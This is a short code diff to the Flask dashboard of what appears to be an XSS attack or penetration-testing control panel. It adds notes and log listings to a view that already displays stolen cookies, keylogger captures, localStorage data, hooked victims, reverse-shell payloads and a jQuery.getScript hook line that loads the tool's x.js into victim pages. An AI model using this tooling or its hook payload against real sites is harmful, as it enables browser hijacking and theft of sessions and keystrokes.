@@ -122,6 +122,7 @@ def index(cms_pag):
         localstorage=db_xxs_localstorage.query.order_by('datum').all()
         template = db_bevindingen_templates.query.all()
         bevindingen = db_bevindingen.query.all()
+        notes = db_notes.query.all()
 
         shells=lezen('http/payloads/shell_443.txt')
         d="jQuery.getScript('"+appdata.localhost+"/x.js');"
@@ -132,6 +133,7 @@ def index(cms_pag):
         js2 = str(js2, 'utf-8')
 
         commands=glob.glob('http/commands/*')
+        logs = glob.glob('meuk/logs/*.rec')
         nmap=glob.glob('raw/nmap/*_quick_scan_tcp.nmap')
 
 
@@ -139,7 +141,7 @@ def index(cms_pag):
 
 
         #overzichtweergeven
-        pagina = render_template('dashboard.html', cms_pag=cms_pag, bevindingen=bevindingen, cookies=cookies, keylogger=keylogger, localstorage=localstorage,  hooked=hooked, aantalhooked=len(hooked), template=template, shells=shells, quotes=quotes(), js1=js1, js2=js2, appdata=appdata, commands=commands, nmap=nmap)
+        pagina = render_template('dashboard.html', cms_pag=cms_pag, bevindingen=bevindingen, cookies=cookies, keylogger=keylogger, localstorage=localstorage,  hooked=hooked, aantalhooked=len(hooked), template=template, shells=shells, quotes=quotes(), js1=js1, js2=js2, appdata=appdata, commands=commands, nmap=nmap, notes=notes, logs=logs)
         return pagina
 
 
